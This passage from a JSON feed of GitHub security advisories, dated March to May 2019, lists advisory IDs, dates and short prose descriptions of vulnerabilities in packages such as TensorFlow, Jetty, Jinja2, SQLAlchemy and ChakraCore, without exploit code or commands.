    "description": "In Apache Archiva 2.0.0 - 2.2.3, it is possible to write files to the archiva server at arbitrary locations by using the artifact upload mechanism. Existing files can be overwritten, if the archiva run user has appropriate permission on the filesystem for the target file.",
    "summary": "Moderate severity vulnerability that affects org.apache.archiva:archiva"
  },
  {
    "ghsaId": "GHSA-4wjq-69rc-8wcp",
    "publishedAt": "2019-05-02T15:21:34Z",
    "description": "Apache Camel's File is vulnerable to directory traversal. Camel 2.21.0 to 2.21.3, 2.22.0 to 2.22.2, 2.23.0 and the unsupported Camel 2.x (2.19 and earlier) versions may be also affected.",
    "summary": "Moderate severity vulnerability that affects org.apache.camel:camel-core"
  },
  {
    "ghsaId": "GHSA-j44m-qm6p-hp7m",
    "publishedAt": "2019-05-01T18:37:31Z",
    "description": "A vulnerability was found in node-tar before version 4.4.2. An Arbitrary File Overwrite issue exists when extracting a tarball containing a hardlink to a file that already exists on the system, in conjunction with a later plain file with the same name as the hardlink. This plain file content replaces the existing file content.",
    "summary": "High severity vulnerability that affects tar"
  },
  {
    "ghsaId": "GHSA-x2mc-8fgj-3wmr",
    "publishedAt": "2019-05-01T18:37:18Z",
    "description": "A vulnerability was found in tar-fs before 1.16.2. An Arbitrary File Overwrite issue exists when extracting a tarball containing a hardlink to a file that already exists on the system, in conjunction with a later plain file with the same name as the hardlink. This plain file content replaces the existing file content.",
    "summary": "High severity vulnerability that affects tar-fs"
  },
  {
    "ghsaId": "GHSA-72fv-qgj6-2w2p",
    "publishedAt": "2019-05-01T18:37:08Z",
    "description": "Controllers.outgoing in controllers/index.js in NodeBB before 0.7.3 has outgoing XSS.",
    "summary": "Moderate severity vulnerability that affects nodebb"
  },
  {
    "ghsaId": "GHSA-qx2v-j445-g354",
    "publishedAt": "2019-04-30T15:37:34Z",
    "description": "Memcpy parameter overlap in Google Snappy library 1.1.4, as used in Google TensorFlow before 1.7.1, could result in a crash or read from other parts of process memory.",
    "summary": "High severity vulnerability that affects tensorflow"
  },
  {
    "ghsaId": "GHSA-q492-f7gr-27rp",
    "publishedAt": "2019-04-30T15:37:31Z",
    "description": "Invalid memory access and/or a heap buffer overflow in the TensorFlow XLA compiler in Google TensorFlow before 1.7.1 could cause a crash or read from other parts of process memory via a crafted configuration file.",
    "summary": "High severity vulnerability that affects tensorflow"
  },
  {
    "ghsaId": "GHSA-943p-xc6m-c6gr",
    "publishedAt": "2019-04-30T15:37:27Z",
    "description": "** REJECT ** DO NOT USE THIS CANDIDATE NUMBER. ConsultIDs: CVE-2018-7576, CVE-2018-21233. Reason: this candidate was intended for one issue, but the description and references inadvertently combined multiple issues. Notes: All CVE users should consult CVE-2018-7576 and CVE-2018-21233 to determine which ID is appropriate. All references and descriptions in this candidate have been removed to prevent accidental usage.",
    "summary": "High severity vulnerability that affects tensorflow"
  },
  {
    "ghsaId": "GHSA-gc52-xj6p-9pxp",
    "publishedAt": "2019-04-30T15:37:21Z",
    "description": "Keycloak up to version 6.0.0 allows the end user token (access or id token JWT) to be used as the session cookie for browser sessions for OIDC. As a result an attacker with access to service provider backend could hijack user?s browser session.",
    "summary": "Moderate severity vulnerability that affects org.keycloak:keycloak-core"
  },
  {
    "ghsaId": "GHSA-mfg7-x5m7-6p8w",
    "publishedAt": "2019-04-30T15:37:17Z",
    "description": "NULL pointer dereference in Google TensorFlow before 1.12.2 could cause a denial of service via an invalid GIF file.",
    "summary": "Moderate severity vulnerability that affects tensorflow"
  },
  {
    "ghsaId": "GHSA-mw6v-crh8-8533",
    "publishedAt": "2019-04-30T15:36:41Z",
    "description": "Google TensorFlow 1.7.x and earlier is affected by a Buffer Overflow vulnerability. The type of exploitation is context-dependent.",
    "summary": "Critical severity vulnerability that affects tensorflow"
  },
  {
    "ghsaId": "GHSA-6c3j-c64m-qhgq",
    "publishedAt": "2019-04-26T16:29:11Z",
    "description": "jQuery before 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles jQuery.extend(true, {}, ...) because of Object.prototype pollution. If an unsanitized source object contained an enumerable __proto__ property, it could extend the native Object.prototype.",
    "summary": "XSS in jQuery as used in Drupal, Backdrop CMS, and other products"
  },
  {
    "ghsaId": "GHSA-frxx-2m33-6wcr",
    "publishedAt": "2019-04-24T16:11:30Z",
    "description": "Google TensorFlow 1.7 and below is affected by: Buffer Overflow. The impact is: execute arbitrary code (local).",
    "summary": "High severity vulnerability that affects tensorflow"
  },
  {
    "ghsaId": "GHSA-jfq2-rj7f-9gvf",
    "publishedAt": "2019-04-24T16:11:27Z",
    "description": "Google TensorFlow 1.6.x and earlier is affected by: Null Pointer Dereference. The type of exploitation is: context-dependent.",
    "summary": "Null pointer dereference in TensorFlow leads to exploitation"
  },
  {
    "ghsaId": "GHSA-r2v5-5vcr-h3vq",
    "publishedAt": "2019-04-24T16:07:36Z",
    "description": "Apache Zeppelin prior to 0.8.0 had a stored XSS issue via Note permissions. Issue reported by \"Josna Joseph\".",
    "summary": "Moderate severity vulnerability that affects org.apache.zeppelin:zeppelin"
  },
  {
    "ghsaId": "GHSA-c538-924g-99q4",
    "publishedAt": "2019-04-24T16:06:59Z",
    "description": "Apache Zeppelin prior to 0.7.3 was vulnerable to session fixation which allowed an attacker to hijack a valid user session. Issue was reported by \"stone lone\".",
    "summary": "High severity vulnerability that affects org.apache.zeppelin:zeppelin"
  },
  {
    "ghsaId": "GHSA-9x2h-hvg6-4r5p",
    "publishedAt": "2019-04-24T16:06:52Z",
    "description": "In Apache Zeppelin prior to 0.8.0 the cron scheduler was enabled by default and could allow users to run paragraphs as other users without authentication.",
    "summary": "High severity vulnerability that affects org.apache.zeppelin:zeppelin"
  },
  {
    "ghsaId": "GHSA-r28m-g6j9-r2h5",
    "publishedAt": "2019-04-23T16:07:18Z",
    "description": "In Eclipse Jetty version 9.2.27, 9.3.26, and 9.4.16, the server running on Windows is vulnerable to exposure of the fully qualified Base Resource directory name on Windows to a remote client when it is configured for showing a Listing of directory contents. This information reveal is restricted to only the content in the configured base resource directories.",
    "summary": "Information Exposure vulnerability in Eclipse Jetty"
  },
  {
    "ghsaId": "GHSA-xc67-hjx6-cgg6",
    "publishedAt": "2019-04-23T16:07:12Z",
    "description": "In Eclipse Jetty version 7.x, 8.x, 9.2.27 and older, 9.3.26 and older, and 9.4.16 and older, the server running on any OS and Jetty version combination will reveal the configured fully qualified directory base resource location on the output of the 404 error for not finding a Context that matches the requested path. The default server behavior on jetty-distribution and jetty-home will include at the end of the Handler tree a DefaultHandler, which is responsible for reporting this 404 error, it presents the various configured contexts as HTML for users to click through to. This produced HTML includes output that contains the configured fully qualified directory base resource location for each context.",
    "summary": "Installation information leak in Eclipse Jetty"
  },
  {
    "ghsaId": "GHSA-7vx9-xjhr-rw6h",
    "publishedAt": "2019-04-23T16:06:02Z",
    "description": "In Eclipse Jetty version 9.2.26 and older, 9.3.25 and older, and 9.4.15 and older, the server is vulnerable to XSS conditions if a remote client USES a specially formatted URL against the DefaultServlet or ResourceHandler that is configured for showing a Listing of directory contents.",
    "summary": "Low severity vulnerability that affects org.eclipse.jetty:jetty-server"
  },
  {
    "ghsaId": "GHSA-74xw-82v7-hmrm",
    "publishedAt": "2019-04-23T16:04:36Z",
    "description": "python-dbusmock before version 0.15.1 AddTemplate() D-Bus method call or DBusTestCase.spawn_server_template() method could be tricked into executing malicious code if an attacker supplies a .pyc file.",
    "summary": "High severity vulnerability that affects python-dbusmock"
  },
  {
    "ghsaId": "GHSA-84p2-vf58-xhxv",
    "publishedAt": "2019-04-23T16:03:18Z",
    "description": "c3p0 version < 0.9.5.4 may be exploited by a billion laughs attack when loading XML configuration due to missing protections against recursive entity expansion when loading configuration.",
    "summary": "Billion laughs attack in c3p0"
  },
  {
    "ghsaId": "GHSA-wv67-q8rr-grjp",
    "publishedAt": "2019-04-23T15:59:10Z",
    "description": "A prototype pollution vulnerability exists in jQuery versions < 3.4.0 that allows an attacker to inject properties on Object.prototype.",
    "summary": "Moderate severity vulnerability that affects jquery"
  },
  {
    "ghsaId": "GHSA-rcj2-vvjx-87pm",
    "publishedAt": "2019-04-22T17:15:40Z",
    "description": "arrow-kt Arrow before 0.9.0 resolved Gradle build artifacts (for compiling and building the published JARs) over HTTP instead of HTTPS. Any of these dependent artifacts could have been maliciously compromised by an MITM attack.",
    "summary": "Moderate severity vulnerability that affects io.arrow-kt:arrow-ank-gradle"
  },
  {
    "ghsaId": "GHSA-mh33-7rrq-662w",
    "publishedAt": "2019-04-19T16:55:10Z",
    "description": "The urllib3 library before 1.24.2 for Python mishandles certain cases where the desired set of CA certificates is different from the OS store of CA certificates, which results in SSL connections succeeding in situations where a verification failure is the correct outcome. This is related to use of the ssl_context, ca_certs, or ca_certs_dir argument.",
    "summary": "High severity vulnerability that affects urllib3"
  },
  {
    "ghsaId": "GHSA-r53m-pfr5-7v87",
    "publishedAt": "2019-04-18T14:50:19Z",
    "description": "**Withdrawn:** Duplicate of GHSA-qcxh-w3j9-58qr",
    "summary": "Moderate severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core"
  },
  {
    "ghsaId": "GHSA-qpvx-gpqm-g98j",
    "publishedAt": "2019-04-18T14:28:03Z",
    "description": "Auth0 Auth0-WCF-Service-JWT before 1.0.4 leaks the expected JWT signature in an error message when it cannot successfully validate the JWT signature. If this error message is presented to an attacker, they can forge an arbitrary JWT token that will be accepted by the vulnerable application.",
    "summary": "Critical severity vulnerability that affects Auth0-WCF-Service-JWT"
  },
  {
    "ghsaId": "GHSA-fvx3-g627-phm2",
    "publishedAt": "2019-04-18T14:27:42Z",
    "description": "An SSRF vulnerability was found in an API from Ctrip Apollo through 1.4.0-SNAPSHOT. An attacker may use it to do an intranet port scan or raise a GET request via /system-info/health because the %23 substring is mishandled.",
    "summary": "Moderate severity vulnerability that affects com.ctrip.framework.apollo:apollo"
  },
  {
    "ghsaId": "GHSA-w6j4-3gh2-9f5j",
    "publishedAt": "2019-04-18T14:27:40Z",
    "description": "A number of HTTP endpoints in the Airflow webserver (both RBAC and classic) did not have adequate protection and were vulnerable to cross-site request forgery attacks.",
    "summary": "High severity vulnerability that affects apache-airflow"
  },
  {
    "ghsaId": "GHSA-8vmx-qmch-mpqg",
    "publishedAt": "2019-04-18T14:27:35Z",
    "description": "When running on Windows with enableCmdLineArguments enabled, the CGI Servlet in Apache Tomcat 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39 and 7.0.0 to 7.0.93 is vulnerable to Remote Code Execution due to a bug in the way the JRE passes command line arguments to Windows. The CGI Servlet is disabled by default. The CGI option enableCmdLineArguments is disable by default in Tomcat 9.0.x (and will be disabled by default in all versions in response to this vulnerability). For a detailed explanation of the JRE behaviour, see Markus Wulftange's blog (https://codewhitesec.blogspot.com/2016/02/java-and-command-line-injections-in-windows.html) and this archived MSDN blog (https://web.archive.org/web/20161228144344/https://blogs.msdn.microsoft.com/twistylittlepassagesallalike/2011/04/23/everyone-quotes-command-line-arguments-the-wrong-way/).",
    "summary": "High severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core"
  },
  {
    "ghsaId": "GHSA-887w-45rq-vxgf",
    "publishedAt": "2019-04-16T15:50:41Z",
    "description": "SQLAlchemy through 1.2.17 and 1.3.x through 1.3.0b2 allows SQL Injection via the order_by parameter.",
    "summary": "Moderate severity vulnerability that affects SQLAlchemy"
  },
  {
    "ghsaId": "GHSA-38fc-9xqv-7f7q",
    "publishedAt": "2019-04-16T15:50:39Z",
    "description": "SQLAlchemy 1.2.17 has SQL Injection when the group_by parameter can be controlled.",
    "summary": "Moderate severity vulnerability that affects SQLAlchemy"
  },
  {
    "ghsaId": "GHSA-v2r2-7qm7-jj6v",
    "publishedAt": "2019-04-16T15:10:59Z",
    "description": "Spring Security versions 4.2.x prior to 4.2.12, 5.0.x prior to 5.0.12, and 5.1.x prior to 5.1.5 contain an insecure randomness vulnerability when using SecureRandomFactoryBean#setSeed to configure a SecureRandom instance. In order to be impacted, an honest application must provide a seed and make the resulting random material available to an attacker for inspection.",
    "summary": "Moderate severity vulnerability that affects org.springframework.security:spring-security-core"
  },
  {
    "ghsaId": "GHSA-jwqm-c9f2-2cq3",
    "publishedAt": "2019-04-15T16:19:23Z",
    "description": "Eclipse hawkBit versions prior to 0.3.0M2 resolved Maven build artifacts for the Vaadin based UI over HTTP instead of HTTPS. Any of these dependent artifacts could have been maliciously compromised by a MITM attack. Hence produced build artifacts of hawkBit might be infected.",
    "summary": "Low severity vulnerability that affects org.eclipse.hawkbit:hawkbit-autoconfigure, org.eclipse.hawkbit:hawkbit-boot-starter, org.eclipse.hawkbit:hawkbit-boot-starter-ddi-api, org.eclipse.hawkbit:hawkbit-boot-starter-dmf-api, org.eclipse.hawkbit:hawkbit-boot-starter-mgmt-api, org.eclipse.hawkbit:hawkbit-boot-starter-mgmt-ui, org.eclipse.hawkbit:hawkbit-parent, org.eclipse.hawkbit:hawkbit-starters, org.eclipse.hawkbit:hawkbit-ui, and org.eclipse.hawkbit:hawkbit-update-server"
  },
  {
    "ghsaId": "GHSA-74vq-h4q8-x6jv",
    "publishedAt": "2019-04-15T16:19:19Z",
    "description": "Ansible fetch module before versions 2.5.15, 2.6.14, 2.7.8 has a path traversal vulnerability which allows copying and overwriting files outside of the specified destination in the local ansible controller host, by not restricting an absolute path.",
    "summary": "Critical severity vulnerability that affects ansible"
  },
  {
    "ghsaId": "GHSA-8p7v-2jvj-v54r",
    "publishedAt": "2019-04-12T20:42:25Z",
    "description": "A malicious admin user could edit the state of objects in the Airflow metadata database to execute arbitrary javascript on certain page views.",
    "summary": "Moderate severity vulnerability that affects apache-airflow"
  },
  {
    "ghsaId": "GHSA-2777-2vq8-c4v4",
    "publishedAt": "2019-04-11T16:33:17Z",
    "description": "Sequelize before 5.3.0 does not properly ensure that standard conforming strings are used.",
    "summary": "Moderate severity vulnerability that affects sequelize"
  },
  {
    "ghsaId": "GHSA-f6f2-pwrj-64h3",
    "publishedAt": "2019-04-10T14:31:37Z",
    "description": "In trytond/model/modelstorage.py in Tryton 4.2 before 4.2.21, 4.4 before 4.4.19, 4.6 before 4.6.14, 4.8 before 4.8.10, and 5.0 before 5.0.6, an authenticated user can order records based on a field for which he has no access right. This may allow the user to guess values.",
    "summary": "Moderate severity vulnerability that affects tryton"
  },
  {
    "ghsaId": "GHSA-462w-v97r-4m45",
    "publishedAt": "2019-04-10T14:30:24Z",
    "description": "In Pallets Jinja before 2.10.1, str.format_map allows a sandbox escape.",
    "summary": "High severity vulnerability that affects Jinja2"
  },
  {
    "ghsaId": "GHSA-hj2j-77xm-mc5v",
    "publishedAt": "2019-04-10T14:30:13Z",
    "description": "In Pallets Jinja before 2.8.1, str.format allows a sandbox escape.",
    "summary": "High severity vulnerability that affects Jinja2"
  },
  {
    "ghsaId": "GHSA-qj3f-9gmq-fwv5",
    "publishedAt": "2019-04-09T19:47:29Z",
    "description": "simple-markdown.js in Khan Academy simple-markdown before 0.4.4 allows XSS via a data: or vbscript: URI.",
    "summary": "Moderate severity vulnerability that affects simple-markdown"
  },
  {
    "ghsaId": "GHSA-rcx2-m7jp-p9wj",
    "publishedAt": "2019-04-09T19:47:27Z",
    "description": "In Jupyter Notebook before 5.7.8, an open redirect can occur via an empty netloc. This issue exists because of an incomplete fix for CVE-2019-10255.",
    "summary": "Moderate severity vulnerability that affects notebook"
  },
  {
    "ghsaId": "GHSA-926q-wxr6-3crq",
    "publishedAt": "2019-04-09T19:47:14Z",
    "description": "Roundup 1.6 allows XSS via the URI because frontends/roundup.cgi and roundup/cgi/wsgi_handler.py mishandle 404 errors.",
    "summary": "Moderate severity vulnerability that affects roundup"
  },
  {
    "ghsaId": "GHSA-98f7-p5rc-jx67",
    "publishedAt": "2019-04-09T19:44:40Z",
    "description": "In Materialize through 1.0.0, XSS is possible via the Tooltip feature.",
    "summary": "Low severity vulnerability that affects materialize-css"
  },
  {
    "ghsaId": "GHSA-7752-f4gf-94gc",
    "publishedAt": "2019-04-09T19:44:38Z",
    "description": "In Materialize through 1.0.0, XSS is possible via the Autocomplete feature.",
    "summary": "Low severity vulnerability that affects materialize-css"
  },
  {
    "ghsaId": "GHSA-rg3q-jxmp-pvjj",
    "publishedAt": "2019-04-09T19:44:37Z",
    "description": "In Materialize through 1.0.0, XSS is possible via the Toast feature.",
    "summary": "Low severity vulnerability that affects materialize-css"
  },
  {
    "ghsaId": "GHSA-6jf5-rmhv-38cw",
    "publishedAt": "2019-04-09T19:44:03Z",
    "description": "A remote code execution vulnerability exists in the way that the ChakraCore scripting engine handles objects in memory, aka 'Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-0609, CVE-2019-0680, CVE-2019-0769, CVE-2019-0770, CVE-2019-0771, CVE-2019-0773, CVE-2019-0783.",
    "summary": "High severity vulnerability that affects Microsoft.ChakraCore"
  },
  {
    "ghsaId": "GHSA-pjpj-f6r8-56rm",
    "publishedAt": "2019-04-09T19:43:59Z",
    "description": "A remote code execution vulnerability exists in the way the scripting engine handles objects in memory in Microsoft browsers, aka 'Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-0639, CVE-2019-0680, CVE-2019-0769, CVE-2019-0770, CVE-2019-0771, CVE-2019-0773, CVE-2019-0783.",
    "summary": "High severity vulnerability that affects Microsoft.ChakraCore"
  },
  {
    "ghsaId": "GHSA-fv38-4c3m-25v8",
    "publishedAt": "2019-04-09T19:43:56Z",
    "description": "A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-0611.",
    "summary": "High severity vulnerability that affects Microsoft.ChakraCore"
  },
  {
    "ghsaId": "GHSA-7ph8-f946-q5r7",
    "publishedAt": "2019-04-09T19:43:54Z",
    "description": "A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-0592.",
    "summary": "High severity vulnerability that affects Microsoft.ChakraCore"
  },
  {
    "ghsaId": "GHSA-8qh8-cv77-h83g",
    "publishedAt": "2019-04-09T19:43:46Z",
    "description": "A remote code execution vulnerability exists in the way that the scripting engine handles objects in memory in Microsoft Edge, aka 'Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-0609, CVE-2019-0639, CVE-2019-0680, CVE-2019-0770, CVE-2019-0771, CVE-2019-0773, CVE-2019-0783.",
    "summary": "High severity vulnerability that affects Microsoft.ChakraCore"
  },
  {
    "ghsaId": "GHSA-jhx3-2w5x-x39x",
    "publishedAt": "2019-04-09T19:43:38Z",
    "description": "An information disclosure vulnerability exists when the scripting engine does not properly handle objects in memory in Microsoft Edge, aka 'Scripting Engine Information Disclosure Vulnerability'.",
    "summary": "High severity vulnerability that affects Microsoft.ChakraCore"
  },
  {
    "ghsaId": "GHSA-3w9q-c44j-37jj",
    "publishedAt": "2019-04-09T19:43:32Z",
    "description": "A remote code execution vulnerability exists in the way that the scripting engine handles objects in memory in Microsoft Edge, aka 'Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-0609, CVE-2019-0639, CVE-2019-0680, CVE-2019-0769, CVE-2019-0770, CVE-2019-0771, CVE-2019-0783.",
    "summary": "High severity vulnerability that affects Microsoft.ChakraCore"
  },
  {
    "ghsaId": "GHSA-fvpg-qx3g-7mp7",
    "publishedAt": "2019-04-09T19:43:29Z",
    "description": "A remote code execution vulnerability exists in the way that the scripting engine handles objects in memory in Microsoft Edge, aka 'Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-0609, CVE-2019-0639, CVE-2019-0680, CVE-2019-0769, CVE-2019-0770, CVE-2019-0773, CVE-2019-0783.",
    "summary": "High severity vulnerability that affects Microsoft.ChakraCore"
  },
  {
    "ghsaId": "GHSA-pffw-p2q5-w6vh",
    "publishedAt": "2019-04-08T16:23:36Z",
    "description": "A specially crafted url could be used to access files under the ROOT directory of the application on Apache JSPWiki 2.9.0 to 2.11.0.M2, which could be used by an attacker to obtain registered users' details.",
    "summary": "Moderate severity vulnerability that affects org.apache.jspwiki:jspwiki-builder and org.apache.jspwiki:jspwiki-war"
  },
  {
    "ghsaId": "GHSA-5xc6-fpc7-4qvg",
    "publishedAt": "2019-04-08T15:19:01Z",
    "description": "The Serialize.deserialize() method in CoAPthon 3.1, 4.0.0, 4.0.1, and 4.0.2 mishandles certain exceptions, leading to a denial of service in applications that use this library (e.g., the standard CoAP server, CoAP client, CoAP reverse proxy, example collect CoAP server and client) when they receive crafted CoAP messages.",
    "summary": "High severity vulnerability that affects CoAPthon"
  },
  {
    "ghsaId": "GHSA-c6fm-rgw4-8q73",
    "publishedAt": "2019-04-08T15:18:57Z",
    "description": "The Serialize.deserialize() method in CoAPthon3 1.0 and 1.0.1 mishandles certain exceptions, leading to a denial of service in applications that use this library (e.g., the standard CoAP server, CoAP client, example collect CoAP server and client) when they receive crafted CoAP messages.",
    "summary": "Moderate severity vulnerability that affects CoAPthon3"
  },
  {
    "ghsaId": "GHSA-r8h9-hq9c-2p5c",
    "publishedAt": "2019-04-08T15:18:54Z",
    "description": "Using ktlint to download and execute custom rulesets can result in arbitrary code execution as the served jars can be compromised by a MITM. This attack is exploitable via Man in the Middle of the HTTP connection to the artifact servers. This vulnerability appears to have been fixed in 0.30.0 and later; after commit 5e547b287d6c260d328a2cb658dbe6b7a7ff2261.",
    "summary": "High severity vulnerability that affects com.github.shyiko.ktlint:ktlint-core"
  },
  {
    "ghsaId": "GHSA-2hhw-p8mg-jrm6",
    "publishedAt": "2019-04-08T15:18:40Z",
    "description": "Path traversal vulnerability in http-live-simulator npm package version 1.0.5 allows arbitrary path to be accessed on the file system by a remote attacker.",
    "summary": "High severity vulnerability that affects http-live-simulator"
  },
  {
    "ghsaId": "GHSA-gm29-35c7-8cfw",
    "publishedAt": "2019-04-08T15:18:38Z",
    "description": "XSS in buttle npm package version 0.2.0 causes execution of attacker-provided code in the victim's browser when an attacker creates an arbitrary file on the server.",
    "summary": "Moderate severity vulnerability that affects buttle"
  },
  {
    "ghsaId": "GHSA-vqqv-v9m2-48p2",
    "publishedAt": "2019-04-04T16:28:47Z",
    "description": "Arbitrary code execution (via backdoor code) was discovered in bootstrap-sass 3.2.0.3, when downloaded from rubygems.org. An unauthenticated attacker can craft the ___cfduid cookie value with base64 arbitrary code to be executed via eval(), which can be leveraged to execute arbitrary code on the target system. Note that there are three underscore characters in the cookie name. This is unrelated to the __cfduid cookie that is legitimately used by Cloudflare.",
    "summary": "Critical severity vulnerability that affects bootstrap-sass"
  },
  {
    "ghsaId": "GHSA-535v-4x9q-446c",
    "publishedAt": "2019-04-02T15:47:00Z",
    "description": "In all previously released Apache HBase 2.x versions (2.0.0-2.0.4, 2.1.0-2.1.3), authorization was incorrectly applied to users of the HBase REST server. Requests sent to the HBase REST server were executed with the permissions of the REST server itself, not with the permissions of the end-user. This issue is only relevant when HBase is configured with Kerberos authentication, HBase authorization is enabled, and the REST server is configured with SPNEGO authentication. This issue does not extend beyond the HBase REST server.",
    "summary": "Moderate severity vulnerability that affects org.apache.hbase:hbase"
  },
  {
    "ghsaId": "GHSA-rv62-4pmj-xw6h",
    "publishedAt": "2019-04-02T15:46:54Z",
    "description": "An Open Redirect vulnerability for all browsers in Jupyter Notebook before 5.7.8 and some browsers (Chrome, Firefox) in JupyterHub before 0.9.6 allows crafted links to the login page, which will redirect to a malicious site after successful login. Servers running on a base_url prefix are not affected.",
    "summary": "Moderate severity vulnerability that affects jupyterhub and notebook"
  },
  {
    "ghsaId": "GHSA-72p5-2r6g-fm6v",
    "publishedAt": "2019-04-02T15:46:52Z",
    "description": "Total.js CMS 12.0.0 has XSS related to themes/admin/views/index.html (item.message) and themes/admin/public/ui.js (column.format).",
    "summary": "Moderate severity vulnerability that affects total.js"
  },
  {
    "ghsaId": "GHSA-fmpq-w5q6-9vf9",
    "publishedAt": "2019-04-02T15:46:48Z",
    "description": "In Apache JSPWiki 2.9.0 to 2.11.0.M2, a carefully crafted URL could execute javascript on another user's session. No information could be saved on the server or jspwiki database, nor would an attacker be able to execute js on someone else's browser; only on its own browser.",
    "summary": "Moderate severity vulnerability that affects org.apache.jspwiki:jspwiki-main"
  },
  {
    "ghsaId": "GHSA-jpv3-g4cc-6vfx",
    "publishedAt": "2019-04-02T15:46:42Z",
    "description": "In Apache ActiveMQ 5.0.0 - 5.15.8, unmarshalling corrupt MQTT frame can lead to broker Out of Memory exception making it unresponsive.",
    "summary": "Moderate severity vulnerability that affects org.apache.activemq:activemq-client"
  },
  {
    "ghsaId": "GHSA-q2xp-75m7-gv52",
    "publishedAt": "2019-04-02T15:36:49Z",
    "description": "Robocode through 1.9.3.5 allows remote attackers to cause external service interaction (DNS), as demonstrated by a query for a unique subdomain name within an attacker-controlled DNS zone, because of a .openStream call within java.net.URL.",
    "summary": "Moderate severity vulnerability that affects net.sf.robocode:robocode.api"
  },
  {
    "ghsaId": "GHSA-h2f4-v4c4-6wx4",
    "publishedAt": "2019-03-28T18:33:38Z",
    "description": "In Eclipse Jetty version 9.3.x and 9.4.x, the server is vulnerable to Denial of Service conditions if a remote client sends either large SETTINGs frames container containing many settings, or many small SETTINGs frames. The vulnerability is due to the additional CPU and memory allocations required to handle changed settings.",
    "summary": "Moderate severity vulnerability that affects org.eclipse.jetty:jetty-server"
  },
  {
    "ghsaId": "GHSA-xg75-3277-gvvj",
    "publishedAt": "2019-03-25T18:04:01Z",
    "description": "A path traversal vulnerability in serve npm package version 7.0.1 allows the attackers to read content of arbitrary files on the remote server.",
    "summary": "High severity vulnerability that affects serve"
  },
  {
    "ghsaId": "GHSA-v588-qcp3-jv46",
    "publishedAt": "2019-03-25T18:03:58Z",
    "description": "A bug in handling the ignore files and directories feature in serve 6.5.3 allows an attacker to read a file or list the directory that the victim has not allowed access to.",
    "summary": "Moderate severity vulnerability that affects serve"
  },
  {
    "ghsaId": "GHSA-gwg9-rgvj-4h5j",
    "publishedAt": "2019-03-25T18:03:23Z",
    "description": "An attacker can use the format parameter to inject arbitrary commands in the npm package morgan < 1.9.1.",
    "summary": "Moderate severity vulnerability that affects morgan"
  },
  {
    "ghsaId": "GHSA-cjjf-94ff-43w7",
    "publishedAt": "2019-03-25T18:03:09Z",
    "description": "An issue was discovered in FasterXML jackson-databind prior to 2.7.9.4, 2.8.11.2, and 2.9.6. When Default Typing is enabled (either globally or for a specific property), the service has the Jodd-db jar (for database access for the Jodd framework) in the classpath, and an attacker can provide an LDAP service to access, it is possible to make the service execute a malicious payload.",
    "summary": "High severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind"
  },
  {
    "ghsaId": "GHSA-f58w-649r-qjr9",
    "publishedAt": "2019-03-25T16:18:04Z",
    "description": "Splunk-SDK-Python before 1.6.6 does not properly verify untrusted TLS server certificates, which could result in man-in-the-middle attacks.",
    "summary": "Moderate severity vulnerability that affects splunk-sdk"
  },
  {
    "ghsaId": "GHSA-2fch-jvg5-crf6",
    "publishedAt": "2019-03-25T16:17:53Z",
    "description": "python-gnupg 0.4.3 allows context-dependent attackers to trick gnupg to decrypt other ciphertext than intended. To perform the attack, the passphrase to gnupg must be controlled by the adversary and the ciphertext should be trusted. Related to a \"CWE-20: Improper Input Validation\" issue affecting the affect functionality component.",
    "summary": "Moderate severity vulnerability that affects python-gnupg"
  },
  {
    "ghsaId": "GHSA-5cf4-jqwp-584g",
    "publishedAt": "2019-03-25T16:17:32Z",
    "description": "In Apache Hadoop 2.9.0 to 2.9.1, 2.8.3 to 2.8.4, 2.7.5 to 2.7.6, KMS blocking users or granting access to users incorrectly, if the system uses non-default groups mapping mechanisms.",
    "summary": "Moderate severity vulnerability that affects org.apache.hadoop:hadoop-main"
  },
  {
    "ghsaId": "GHSA-pmv6-gf98-p3r5",
    "publishedAt": "2019-03-25T16:17:18Z",
    "description": "If an attacker can control the port, which in itself is a very sensitive value, they can inject arbitrary OS commands due to the usage of the exec function in a third-party module kill-port < 1.3.2.",
    "summary": "High severity vulnerability that affects kill-port"
  },
  {
    "ghsaId": "GHSA-qwj8-p662-3m7x",
    "publishedAt": "2019-03-25T16:17:05Z",
    "description": "A path traversal vulnerability in localhost-now npm package version 1.0.2 allows the attackers to read content of arbitrary files on the remote server.",
    "summary": "High severity vulnerability that affects localhost-now"
  },
  {
    "ghsaId": "GHSA-gcm4-q2pg-xw89",
    "publishedAt": "2019-03-25T16:16:55Z",
    "description": "A code injection issue was discovered in ipycache through 2016-05-31.",
    "summary": "Moderate severity vulnerability that affects ipycache"
  },
  {
    "ghsaId": "GHSA-869j-5855-hjpm",
    "publishedAt": "2019-03-25T16:16:44Z",
    "description": "Apache Karaf kar deployer reads .kar archives and extracts the paths from the \"repository/\" and \"resources/\" entries in the zip file. It then writes out the content of these paths to the Karaf repo and resources directories. However, it doesn't do any validation on the paths in the zip file. This means that a malicious user could craft a .kar file with \"..\" directory names and break out of the directories to write arbitrary content to the filesystem. This is the \"Zip-slip\" vulnerability - https://snyk.io/research/zip-slip-vulnerability. This vulnerability is low if the Karaf process user has limited permission on the filesystem. Any Apache Karaf releases prior 4.2.3 is impacted.",
    "summary": "Moderate severity vulnerability that affects org.apache.karaf:apache-karaf and org.apache.karaf:karaf"
  },
  {
    "ghsaId": "GHSA-573x-jhqh-jg36",
    "publishedAt": "2019-03-25T16:16:27Z",
    "description": "Prior to version 0.3.0, chloride's use of net-ssh resulted in host fingerprints for previously unknown hosts getting added to the user's known_hosts file without confirmation. In version 0.3.0 this is updated so that the user's known_hosts file is not updated by chloride.",
    "summary": "Moderate severity vulnerability that affects chloride"
  },
  {
    "ghsaId": "GHSA-vv4c-g6q7-p3q7",
